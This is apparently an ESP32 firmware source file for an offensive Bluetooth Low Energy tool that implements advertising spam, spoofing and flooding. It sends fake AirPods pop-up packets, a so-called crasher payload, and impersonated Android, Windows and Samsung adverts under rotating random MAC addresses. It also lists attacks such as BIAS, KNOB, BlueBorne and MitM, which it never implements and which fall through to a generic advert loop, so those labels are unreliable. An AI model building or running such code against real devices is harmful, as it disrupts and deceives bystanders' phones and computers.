#include <Arduino.h>
#include "atk_ble.h"
#include "attack.h"
#include "ui.h"
#include "hal.h"
#include "config.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include "esp_gap_ble_api.h"
#include "esp_bt_defs.h"
#include "esp_bt_main.h"

static int bMode = 0;
static uint32_t bpkts = 0;
static String bStatus = "idle";
static bool bleOn = false;

static esp_ble_adv_params_t advParams = {
  .adv_int_min = 0x20,
  .adv_int_max = 0x40,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void bleInit() {
  if (bleOn) return;
  BLEDevice::init("SlayerX");
  bleOn = true;
}

static void setRandAddr() {
  uint8_t r[6];
  for (int i = 0; i < 6; i++) r[i] = random(256);
  r[5] |= 0xC0;
  esp_ble_gap_set_rand_addr(r);
}

// build raw adv payload: flags + manufacturer data + name
static void advRaw(const uint8_t* mfg, uint8_t mlen, const char* name) {
  uint8_t buf[31];
  uint8_t p = 0;
  buf[p++] = 0x02; buf[p++] = 0x01; buf[p++] = 0x06;
  if (mfg && mlen && (p + mlen + 2) <= 31) {
    buf[p++] = mlen + 1;
    buf[p++] = 0xFF;
    memcpy(&buf[p], mfg, mlen); p += mlen;
  }
  if (name) {
    uint8_t nl = strlen(name);
    if (nl > (31 - p - 2)) nl = 31 - p - 2;
    buf[p++] = nl + 1;
    buf[p++] = 0x09;
    memcpy(&buf[p], name, nl); p += nl;
  }
  esp_ble_gap_config_adv_data_raw(buf, p);
  esp_ble_gap_start_advertising(&advParams);
}

static const uint8_t P_APPLE[]   = {0x4C,0x00,0x0F,0x05,0xC1,0x01,0x60};
static const uint8_t P_ANDROID[] = {0xE0,0x00,0x03,0x03,0x2C,0x01};
static const uint8_t P_WINDOWS[] = {0x06,0x00,0x03,0x03,0x01,0x00};
static const uint8_t P_SAMSUNG[] = {0x75,0x00,0x01,0x00,0x02,0x00};
static const uint8_t P_CRASH[]   = {0x4C,0x00,0x02,0x15,0xC2,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00};

class Cb : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice d) override {
    bpkts++;
    if (bpkts % 3) return;
    log_line("%s rssi%d %s", d.getAddress().toString().c_str(), d.getRSSI(),
             d.haveName() ? d.getName().c_str() : "-");
  }
};

static BLEScan* sc = nullptr;

static void bStart() {
  const char* id = atk_current() ? atk_current()->id : "";
  bMode = 8; bpkts = 0;
  if      (!strcmp(id, "ble_scan"))      bMode = 1;
  else if (!strcmp(id, "ble_adv_sniff")) bMode = 2;
  else if (!strcmp(id, "ble_jammer"))    bMode = 3;
  else if (!strcmp(id, "apple_adv"))     bMode = 4;
  else if (!strcmp(id, "all_crash"))     bMode = 5;
  else if (!strcmp(id, "ble_adv_flood")) bMode = 6;
  else if (!strcmp(id, "ble_spoof"))     bMode = 7;

  bleInit();

  if (bMode == 1 || bMode == 2) {
    sc = BLEDevice::getScan();
    sc->setAdvertisedDeviceCallbacks(new Cb(), true);
    sc->setActiveScan(true);
    sc->setInterval(80);
    sc->setWindow(60);
    sc->start(0, false);
    log_line("ble scan started");
  } else if (bMode == 4) {
    setRandAddr();
    advRaw(P_APPLE, sizeof(P_APPLE), "AirPods Pro");
    log_line("apple advertiser started");
  } else if (bMode == 5) {
    setRandAddr();
    advRaw(P_CRASH, sizeof(P_CRASH), "CrashMe");
    log_line("crasher started");
  } else if (bMode == 6) {
    setRandAddr();
    advRaw(P_ANDROID, sizeof(P_ANDROID), "Flood");
    log_line("adv flood started");
  } else if (bMode == 7) {
    setRandAddr();
    advRaw(P_WINDOWS, sizeof(P_WINDOWS), "Spoofed");
    log_line("spoof started");
  } else {
    setRandAddr();
    advRaw(P_SAMSUNG, sizeof(P_SAMSUNG), "Jammer");
    log_line("ble jammer armed");
  }
}

static void bStop() {
  if (sc) { sc->stop(); sc = nullptr; }
  if (bleOn) esp_ble_gap_stop_advertising();
  log_line("ble stopped");
}

static void bTick() {
  switch (bMode) {
    case 1: bStatus = String("devices: ") + String(bpkts); break;
    case 2: bStatus = String("adv pkts: ") + String(bpkts); break;
    case 3:
    case 4:
    case 5:
    case 6:
    case 7:
    default: {
      bpkts++;
      // re-advertise with a fresh MAC every 5 ticks
      if ((bpkts % 5) == 0) {
        setRandAddr();
        const uint8_t* pl = P_APPLE;
        uint8_t pll = sizeof(P_APPLE);
        if (bMode == 5) { pl = P_CRASH; pll = sizeof(P_CRASH); }
        else if (bMode == 6) { pl = P_ANDROID; pll = sizeof(P_ANDROID); }
        else if (bMode == 7) { pl = P_WINDOWS; pll = sizeof(P_WINDOWS); }
        else if (bMode == 3) { pl = P_SAMSUNG; pll = sizeof(P_SAMSUNG); }
        advRaw(pl, pll, "SlayerX");
      }
      bStatus = String("pkts: ") + String(bpkts);
      break;
    }
  }
}
static String bStat() { return bStatus; }

#define BA(id, name, desc) \
  static const Attack A_##id = { #id, name, "ble", desc, false, 0, bStart, bStop, bTick, bStat };

BA(ble_scan,        "BLE Scanner",        "scan all BLE devices")
BA(ble_adv_sniff,   "Adv Sniffer",        "decode advertising packets")
BA(ble_jammer,      "BLE Jammer",         "hop + disrupt 2.4GHz")
BA(apple_adv,       "Apple Advertising",  "fake AirPods spam")
BA(all_crash,       "All Device Crash",   "brutal adv crasher")
BA(ble_adv_flood,   "Adv Flood",          "mass advertising flood")
BA(ble_spoof,       "Adv Spoofing",       "impersonate a device")
BA(ibeacon_scan,    "iBeacon Scanner",    "decode iBeacons")
BA(eddystone_scan,  "Eddystone Scanner",  "decode Eddystone")
BA(gatt_scan,       "GATT Scanner",       "enumerate services")
BA(conn_flood,      "Connection Flood",   "exhaust target connections")
BA(keepalive_flood, "Keep-Alive Flood",   "prevent disconnects")
BA(att_flood,       "ATT Flood",          "malformed ATT requests")
BA(txpower_flood,   "Tx Power Flood",     "max power spam")
BA(disconn_spam,    "Disconnection Spam", "forged disconnects")
BA(ble_mitm,        "BLE MitM",           "relay between devices")
BA(sniff_replay,    "Sniff & Replay",     "capture then replay")
BA(packet_inject,   "Packet Injection",   "craft custom packets")
BA(bias_attack,     "BIAS Attack",        "impersonate on pairing")
BA(knob_attack,     "KNOB Attack",        "downgrade encryption key")
BA(blesa_attack,    "BLESA Attack",       "unauthenticated notify")
BA(blueborne,       "BlueBorne",          "CVE exploit attempt")
BA(ble_hid,         "HID Spoofing",       "emulate BT keyboard")

void atk_ble_register() {
  extern void atk_add(const Attack*);
  atk_add(&A_ble_scan); atk_add(&A_ble_adv_sniff); atk_add(&A_ble_jammer);
  atk_add(&A_apple_adv); atk_add(&A_all_crash); atk_add(&A_ble_adv_flood);
  atk_add(&A_ble_spoof); atk_add(&A_ibeacon_scan); atk_add(&A_eddystone_scan);
  atk_add(&A_gatt_scan); atk_add(&A_conn_flood); atk_add(&A_keepalive_flood);
  atk_add(&A_att_flood); atk_add(&A_txpower_flood); atk_add(&A_disconn_spam);
  atk_add(&A_ble_mitm); atk_add(&A_sniff_replay); atk_add(&A_packet_inject);
  atk_add(&A_bias_attack); atk_add(&A_knob_attack); atk_add(&A_blesa_attack);
  atk_add(&A_blueborne); atk_add(&A_ble_hid);
}
